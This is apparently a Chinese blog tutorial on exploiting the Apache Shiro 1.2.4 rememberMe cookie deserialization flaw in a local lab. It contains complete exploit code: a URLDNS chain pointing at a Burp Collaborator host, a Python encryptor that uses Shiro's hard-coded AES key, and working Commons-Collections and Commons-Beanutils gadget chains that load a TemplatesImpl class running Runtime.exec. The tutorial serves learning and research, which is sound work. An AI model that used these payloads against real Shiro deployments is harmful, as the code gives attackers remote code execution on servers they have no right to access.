# Java反序列化之Shiro反序列化：

环境搭建：

<https://github.com/apache/shiro.git>

在samples/web/目录下的pom.xml文件中修改版本：

    
    
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>jstl</artifactId>
        <version>1.2</version>
        <scope>runtime</scope>
    </dependency>
    

## Shiro漏洞分析：

在我们进行Shiro登录以后，我们发现勾选记住密码，在数据包中会返回一个cookie信息，于是我们猜测这个cookie的认证信息，有可能是通过反序列化序列化来进行传递的，所以我们就思考看看能不能找到他的逻辑：

![](./img/7004938200462494381.png)

然后我们就来查找一下源代码中的`cookie`是如何进行处理的，然后我们就全局搜索一个库项目和库中对`cookie`处理下类，然后我们就找到了`shiro-web`下面的一个`CookieRememberMeMananger`类：

![](./img/3534984716058859197.png)

然后我们在类中发现了一个方法，是用来获取返回包里cookie数据并进行base64解码，我们就找哪里调用了它：

![](./img/3492894825250962849.png)

然后我们就找到了AbstractRememberMenManager类下面的getRememberedPrincipals方法，这里又调用了convertBytesToPrincipals，从字面意思上我们也能够知道是对字节信息的一个认证，然后我们跟进一下：

    
    
    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
            PrincipalCollection principals = null;
            try {
                byte[] bytes = getRememberedSerializedIdentity(subjectContext);
                //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
                if (bytes != null && bytes.length > 0) {
                    principals = convertBytesToPrincipals(bytes, subjectContext);
                }
            } catch (RuntimeException re) {
                principals = onRememberedPrincipalFailure(re, subjectContext);
            }
    
            return principals;
        }
    

可以发现convertBytesToPrincipals中对字节进行了解密和反序列化操作：

    
    
    protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
            if (getCipherService() != null) {
                bytes = decrypt(bytes);
            }
            return deserialize(bytes);
        }
    

![](./img/8394871879902639208.png)

然后我们跟进两个方法发现deserialize其实是一个原生的反序列化的代码，而解密的地方是一个需要key的对称加密的解密，所以我们对照一下就会发现getDecryptionCipherKey()函数的返回值其实就是我们需要的key，我们就看一下它

    
    
    protected byte[] decrypt(byte[] encrypted) {
            byte[] serialized = encrypted;
            CipherService cipherService = getCipherService();
            if (cipherService != null) {
                ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
                serialized = byteSource.getBytes();
            }
            return serialized;
        }
    
    
    public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException {
    

可以发现这里返回的是一个常量，我们来找一下这个常量从哪里进行赋值的：

    
    
    private byte[] decryptionCipherKey;    
    public byte[] getDecryptionCipherKey() {
        return decryptionCipherKey;
    }
    

![](./img/5015025910921317785.png)

![](./img/3184596113217734735.png)

然后我们一路跟进发现跟到了setCipherKey的方法，然后在调用setCipherKey的时候我们发现了常量：

    
    
    public AbstractRememberMeManager() {
            this.serializer = new DefaultSerializer<PrincipalCollection>();
            this.cipherService = new AesCipherService();
            setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
    }
    

然后这个常量其实就是一个固定的值：

    
    
    private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    

也就是说，在Shiro1.2.4这个版本当中呢，我们可以发现对cookie的任何加密都是一样的一个key，算法其实就是一个AES加密的算法。

所以我们就来梳理一下我们的攻击流程，现在我们已经得到了AES加密算法的key和算法过程，我们就能够把我们想构造的序列化字符串进行AES加密，然后进行base64编码，然后放到能够反序列化的位置进行反序列化，然后我们就需要考虑应该用什么payload来进行攻击，即我们要攻击它的什么库：

![](./img/7873144818834457866.png)

比如这里我们可以发现存在CC的漏洞版本，但是这里是不能进行攻击的，因为在Shiro中他只是进行了库的依赖，没有import因此在真正的项目中是不存在CC链可以打的，所以这里我们还是先使用JDK本来的URLDNS链进行一个测试，来看一下漏洞的原理

    
    
    package EXP;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.net.URL;
    import java.util.HashMap;
    
    public class URLDNS {
    
        public static void main(String[] args) throws Exception{
            HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
            URL url=new URL("http://vpodxpp6sr0x7cdatw515g8d248uwj.burpcollaborator.net");
    
    
            Class c = url.getClass();
            Field hashcodefield = c.getDeclaredField("hashCode");
            hashcodefield.setAccessible(true);
            hashcodefield.set(url,1234);
            hashmap.put(url,1);
    
            hashcodefield.set(url,-1);
            serialize(hashmap);
        }
    
        public static void serialize(Object obj) throws IOException{
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
    }
    

## ShiroAES加密：

    
    
    import base64
    import uuid
    from random import Random
    from Crypto.Cipher import AES
    def get_file_data(filename):
        with open(filename,'rb') as f:
            data = f.read()
        return data
    def aes_enc(data):
        BS = AES.block_size
        pad = lambda s:s +((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key = "kPH+bIxk5D2deZiIxcaaaA=="
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key),mode,iv)
        ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
        return ciphertext
    def aes_dec(enc_data):
        enc_data = base64.b64encode(enc_data)
        unpad = lambda s : s[:-s[-1]]
        key = "kPH+bIxk5D2deZiIxcaaaA=="
        mode = AES.MODE_CBC
        iv = enc_data[:16]
        encryptor = AES.new(base64.b64decode(key),mode,iv)
        plaintext = encryptor.decrypt(enc_data[16:])
        plaintext = unpad(plaintext)
        return plaintext
    if __name__ == '__main__':
        data = get_file_data("ser.bin")
        print(aes_enc(data))
    ##YAYVY7DARXibfT6A/hXr3RFQeIZCzXDNgjhDNCDeE6EkNFytF25SjuuKVMGU38Oo/Ew3ehAiBXio6HVBJBihw/sJhghjkZN3nw018zqrm2AFueo4fjtjWmu0+QmReeFcIhaNAKKve4u9lIJsQNSrAU0Otx7joF43AwFAoMyY0nPZPK0X2Mk359o73Pb+t8EGeq/tuTozt2TUQYmo1bbTV3YARGExmBdGejDe+FaQgkOTKT/Byj0p0TtepY3t/PKn6bj2AEtIhqIXgKvUYbwVj04Vn8SxRITh7DxkNpDAXGZwU0NXA8sz5hWBndLvhpnZKiaaamSNK/wTHquPClSOcyrdiEZ8uy9UCvQa1JyewdU/YuKyETx4b8RVkOgUmSMCEwY75gzmPg2cgoj6gddgtBpALQa3e9fy4vce5aTWwNdX199vabzzFdGchwy/9JGIe15A4MsRunrVyobq75hmJwdSaaEuicn7mQSTMOeo6sHIzgBhikD7PGAHcubsOf/Cu1us/rIlCg04N5a5fJlXRw==
    

然后我们把得到的来进行一个替换，发现能够收到DNS请求,注意要删除JSESSIONID

![](./img/7640372048517814140.png)

## CC攻击：

### 纯CC链失败原因：

因为上面没有引入`Commons-Collection3.2.1`的依赖，所以我们不能使用CC进行攻击，所以这里我们在对应的`pom.xml`上面加上对CC3版本的依赖，然后将CC6的`payload`进行AES加密以后提交看一下效果：

但是日志提示了报错，我们可以发现`Transformer`这个数组类并没有加载成功：

![](./img/2367238828743875567.png)

然后我们就来看一下触发反序列化是怎么实现的：我们可以发现这里反序列化触发的`readObject`函数是调用的`ClassResolvingObjectInputStream`，并不是调用的原生类`ObjectInputStream`里面的`readObject`函数。

![](./img/7720779295046635105.png)

所以我们来跟进一下这个类，我们可以发现这里重写了一个`resolveClasss`方法，在原生的`Java`反序列化中，会自动调用`resolveClass`方法，如果它进行了重写，就会调用到重写的方法，然后我们来前后对比一下这个重写的方法和原生之间的区别，可以发现在`Shiro`里面`return`的是`ClassUtil`的`forName`方法，而`ClassUtil`是`Shiro`自己写的一个工具类

    
    
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException
        {
            String name = desc.getName();
            try {
                return Class.forName(name, false, latestUserDefinedLoader());
            } catch (ClassNotFoundException ex) {
                Class<?> cl = primClasses.get(name);
                if (cl != null) {
                    return cl;
                } else {
                    throw ex;
                }
            }
        }
    

![](./img/5928371197263076130.png)

然后我们设置断点来跟进一下ClassUtils类，可以看到里面加载类的时候是双亲委派原则去进行的加载和调用，问题的宏观表现是ClassLoader里面的loadClass不能够加载数组类，但是class.forName可以，所以这里的问题解决方法就是不出现数组类：

![](./img/3662590974849178730.png)

### 复合CC链构造：

  * 所以我们来改写一下`CC`的`exp`版本，让他不出现数组类,即不调用`ChainedTransformer`然后我们就发现了CC2这一条攻击链并不存在数组类的调用，但是`CC2`攻击链是针对的`CommonCollections4`版本的`TransformingComparator`类下面的`compare`进行的利用，当前`3.2.1`版本并不存在，所以我们要进行一下改写：

![](./img/2319583181166565498.png)

  * 这里我们就要进行一下CC链的拼接，首先攻击方法不能够选择命令执行，因为没有数组类我们就无法控制变量，因此我们只能够选择任意类加载加载恶意类造成代码执行，所以这里后半条链就是任意类加载加上InvokerTransform

  * 而前半条链我们可以发现在对CC3.2.1版本的攻击链中，只有CC6对应的HashMap中的put方法我们可以控制输入，所以我们就想通过put传入我们的恶意类，然后走通这一条攻击链。

  * 所以我们链子的拼接是这个形式：

![](./img/5310518863103330965.png)

    
    
    package EXP;
    
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import java.io.*;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.HashMap;
    import java.util.Map;
    
    public class ShiroExpCC326 {
        public static void main(String[] args) throws Exception {
    //CC3
            TemplatesImpl Templates = new TemplatesImpl();
            Class tc = Templates.getClass();
            Field nameField = tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(Templates, "aaa");
    
            Field bytecodeField = tc.getDeclaredField("_bytecodes");
            bytecodeField.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("D://Tomcat/CC/target/classes/EXP/Demo.class"));
            byte[][] codes = {code};
            bytecodeField.set(Templates, codes);
    //CC2
            InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null,null);
    
    //CC6
            HashMap<Object,Object> map = new HashMap<>();
            Map<Object,Object> Lazymap = LazyMap.decorate(map,new ConstantTransformer(1));
    
    
            //要通过TiedMapEntry里面getValue()方法来调用map[Lazymap].get(key[Templates])方法,从而传入           transform(key)来调用
            TiedMapEntry tiedMapEntry = new TiedMapEntry(Lazymap,Templates);
    
            HashMap<Object,Object> map2 = new HashMap<>();
            map2.put(tiedMapEntry,"bbb");
            //同步上面的那个key，put完删掉防止链子走不通
            Lazymap.remove(Templates);
    
            Class c = LazyMap.class;
            Field factoryFied = c.getDeclaredField("factory");
            factoryFied.setAccessible(true);
            factoryFied.set(Lazymap,invokerTransformer);
    
            serialize(map2);
        }
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
    
        public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    }
    

Demo.java:

    
    
    package EXP;
    
    import java.io.IOException;
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    
    public class Demo extends AbstractTranslet{
        static {
            try {
                Runtime.getRuntime().exec("calc");
            }catch (IOException e){
               e.printStackTrace();
            }
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    }
    

![](./img/8813741769972093251.png)

## CB攻击：

因为我们知道Shiro原生类中是不存在CC依赖的，所以当没有CC依赖的时候我们就无法通过CC来进行攻击，我们就需要另外找一个无依赖的方式对Shiro的反序列化漏洞进行利用：

通过Shiro自带的依赖`Commons-beanutils`进行攻击：

![](./img/1010700698106069834.png)

我们知道`Commons-Collections`是对`Java`集合做的一个功能增强，这里的`Commons-beanutils`是对`JavaBean`做的优化和提升。

### JavaBean：

在Java中，有很多`class`的定义都符合这样的规范：

  * 若干`private`实例字段；
  * 通过`public`方法来读写实例字段。

    
    
    package JavaBeanTest;
    
    public class Person {
        private String name;
        private int age;
        public Person(String name,int age){
            this.name = name;
            this.age = age;
        }
        public String getName() { return this.name; }
        public void setName(String name) { this.name = name; }
    
        public int getAge() { return this.age; }
        public void setAge(int age) { this.age = age; }
    }
    

如果读写方法符合以下这种命名规范：

    
    
    // 读方法:
    public Type getXyz()
    // 写方法:
    public void setXyz(Type value)
    

那么这种`class`被称为`JavaBean`，如果我们正常使用的话我们是这样进行使用的：

    
    
    package JavaBeanTest;
    
    public class BeanTest {
        public static void main(String[] args) throws Exception{
            Person person = new Person("aaa",10);
            System.out.println(person.getName());
        }
    }
    

### 调用链：

而在JavaBean中，存在一种动态类的执行方式，通过字符串来进行动态加载，然后我们就有可能在这里实现一个代码执行，所以我们来跟进一下看看这个动态的执行方式究竟是如何实现的：

    
    
    package JavaBeanTest;
    
    import org.apache.commons.beanutils.PropertyUtils;
    
    public class BeanTest {
        public static void main(String[] args) throws Exception{
            Person person = new Person("aaa",10);
            System.out.println(PropertyUtils.getProperty(person,"age"));
        }
    }
    

![](./img/480435061818865190.png)

我们一路跟进，可以发现在这个位置，对age转换为Age以后（驼峰命名：第一个属性值小写），调用了Person类中的getAge函数，所以下面进行了反射调用。

![](./img/5529022193022761901.png)

![](./img/4138186354916484484.png)

然后我们可以结合之前的CC3的链子中，在我们查找调用newTransformer的时候选择了TrAXFliter里面的方法调用，而另外存在一个newTransformer调用的方法getOutputProperties，在CC中因为后续调用并不方便我们没用选择它，但是这个方法正好符合在JavaBean里面驼峰命名的一个形式，所以我们可以在JavaBean里面对他直接进行调用：

![](./img/3250528871364989890.png)

    
    
    package EXP;
    
    import JavaBeanTest.Person;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import org.apache.commons.beanutils.PropertyUtils;
    
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    
    public class ShiroCB {
        public static void main(String[] args) throws Exception {
    //        Person person = new Person("aaa",10);
    //        System.out.println(PropertyUtils.getProperty(person,"age"));
            TemplatesImpl templates = new TemplatesImpl();
    
            Class tc = templates.getClass();
            Field nameField = tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates, "aaa");
    
            Field bytecodeField = tc.getDeclaredField("_bytecodes");
            bytecodeField.setAccessible(true);
    
            Field tfactoryField = tc.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());
    
            byte[] code = Files.readAllBytes(Paths.get("D://Tomcat/CC/target/classes/EXP/Demo.class"));
            byte[][] codes = {code};
            bytecodeField.set(templates, codes);
            PropertyUtils.getProperty(templates,"outputProperties");
        }
    }
    

然后我们再来寻找哪里能够调用PropertyUtils类里面的getProperty方法，找到了BeanCompared类里面的compare方法中调用了这个函数，这里我们就可以联想到CC2里面的优先队列类中使用到了compare，这里我们就可以进行拼接：

![](./img/8595487466819900943.png)

![](./img/4191380332028900541.png)

### EXP问题:

    
    
    package EXP;
    
    import JavaBeanTest.Person;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.sun.org.apache.xml.internal.serializer.OutputPropertyUtils;
    import org.apache.commons.beanutils.BeanComparator;
    import org.apache.commons.beanutils.PropertyUtils;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    
    import java.io.*;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.PriorityQueue;
    
    public class ShiroCB {
        public static void main(String[] args) throws Exception {
    
            TemplatesImpl templates = new TemplatesImpl();
            Class tc = templates.getClass();
            Field nameField = tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates, "aaa");
    
            Field bytecodeField = tc.getDeclaredField("_bytecodes");
            bytecodeField.setAccessible(true);
    
            Field tfactoryField = tc.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());
    
            byte[] code = Files.readAllBytes(Paths.get("D://Tomcat/CC/target/classes/EXP/Demo.class"));
            byte[][] codes = {code};
            bytecodeField.set(templates, codes);
    
    
    //PropertyUtils Properties = (PropertyUtils) PropertyUtils.getProperty(templates, "getOutputProperties");
    
            BeanComparator beanComparator = new BeanComparator("outputProperties");
    //CC里面有，为了不报错，传入一个，反射的时候再修改回来
            TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer<>(1));
    
            PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
    
            priorityQueue.add(templates);
            priorityQueue.add(2);
    //改回来：
            Class<PriorityQueue> c = PriorityQueue.class;
            Field comparetorFied = c.getDeclaredField("comparator");
            comparetorFied.setAccessible(true);
            comparetorFied.set(priorityQueue,beanComparator);
    
            serialize(priorityQueue);
        }
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
    
        public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    }
    

我们把用这个exp打发现并没有打通，这里查看日志发现了报错，报了一个CC的错，而我们并没有使用到CC链：

![](./img/2426022450476640804.png)

原因是JavaBean中有和CC重叠的地方，这里的ComparableComparator就是CC里面的东西，所以这里我们就不用这个构造函数了：

    
    
    public BeanComparator( String property ) {
            this( property, ComparableComparator.getInstance() );
        }
    

用一个自定义的构造函数，我们自己传一个CB或者JDK中有的comparator，一方面要继承Comparator这个接口，另一方面要继承`Serializable`：

    
    
    public BeanComparator( String property, Comparator comparator ) {
            setProperty( property );
            if (comparator != null) {
                this.comparator = comparator;
            } else {
                this.comparator = ComparableComparator.getInstance();
            }
        }
    

这里用一个取交集的脚本筛选一下：

    
    
    with open('Comparator.txt') as f:
        data = f.readline()
        coms=[]
        while data:
            coms.append(data)
            data = f.readline()
    with open('Serializable.txt') as d:
        data = d.readline()
        sers = []
        while data:
            sers.append(data)
            data = d.readline()
    print(*[i for i in coms if i in sers])
    
    
    AttrCompare
     BeanComparator
     BooleanComparator
     BooleanComparator
     CaseInsensitiveComparator (String )
     ComparableComparator
     ComparableComparator
     ComparatorChain
     ComparatorChain
     FixedOrderComparator
     FixedOrderComparator
     InsensitiveComparator (Headers )
     KeyAnalyzer
     LayoutComparator
     NaturalOrderComparator (Comparators )
     NullComparator (Comparators )
     NullComparator
     NullComparator
     PropertySorter (ClassInfoImpl )
     ReverseComparator (Collections )
     ReverseComparator
     ReverseComparator
     ReverseComparator2 (Collections )
     StringKeyAnalyzer
     TransformingComparator
     TransformingComparator
     TreeTransferHandler (BasicTreeUI )
     Block
     JavaClass
     NumericShaper
     ObjectStreamClass
     ShellFolder
    

然后我们直接加上一个自定义的类就可以成功了

### ShiroCBexp：

    
    
    package EXP;
    
    import JavaBeanTest.Person;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
    import com.sun.org.apache.xml.internal.serializer.OutputPropertyUtils;
    import org.apache.commons.beanutils.BeanComparator;
    import org.apache.commons.beanutils.PropertyUtils;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    
    import java.io.*;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.PriorityQueue;
    
    public class ShiroCB {
        public static void main(String[] args) throws Exception {
    
            TemplatesImpl templates = new TemplatesImpl();
            Class tc = templates.getClass();
            Field nameField = tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates, "aaa");
    
            Field bytecodeField = tc.getDeclaredField("_bytecodes");
            bytecodeField.setAccessible(true);
    
            Field tfactoryField = tc.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());
    
            byte[] code = Files.readAllBytes(Paths.get("D://Tomcat/CC/target/classes/EXP/Demo.class"));
            byte[][] codes = {code};
            bytecodeField.set(templates, codes);
    
    
    //PropertyUtils Properties = (PropertyUtils) PropertyUtils.getProperty(templates, "getOutputProperties");
    
            BeanComparator beanComparator = new BeanComparator("outputProperties",new AttrCompare());
    //CC里面有，为了不报错，传入一个，反射的时候再修改回来
            TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer<>(1));
    
            PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
    
            priorityQueue.add(templates);
            priorityQueue.add(2);
    //改回来：
            Class<PriorityQueue> c = PriorityQueue.class;
            Field comparetorFied = c.getDeclaredField("comparator");
            comparetorFied.setAccessible(true);
            comparetorFied.set(priorityQueue,beanComparator);
    
            serialize(priorityQueue);
        }
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
    
        public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    }
    

![](./img/8520378293370127781.png)

最后还是给出这两个对应的调用链过程：

![](./img/2417601903807761884.png)

附：ysoserial中工具生成的payload有可能打不了，这里的原因是因为依赖库的版本问题：serialVersionUID不匹配

![](./img/2318178367166492685.png)

在ysoserial中使用的是commons-beanutils使用的版本是1.9.2而我们使用的CB版本是1.8.3，所以会报依赖版本不同的错误;

![](./img/6596818946220449168.png)

最后感慨一下，JAVA反序列化的内容大部分是跟着白日梦组长学的，讲的非常详细，感觉深刻理解了链子的原理，如果有的师傅看文章感觉有一点迷的话，可以去听一下组长讲的课

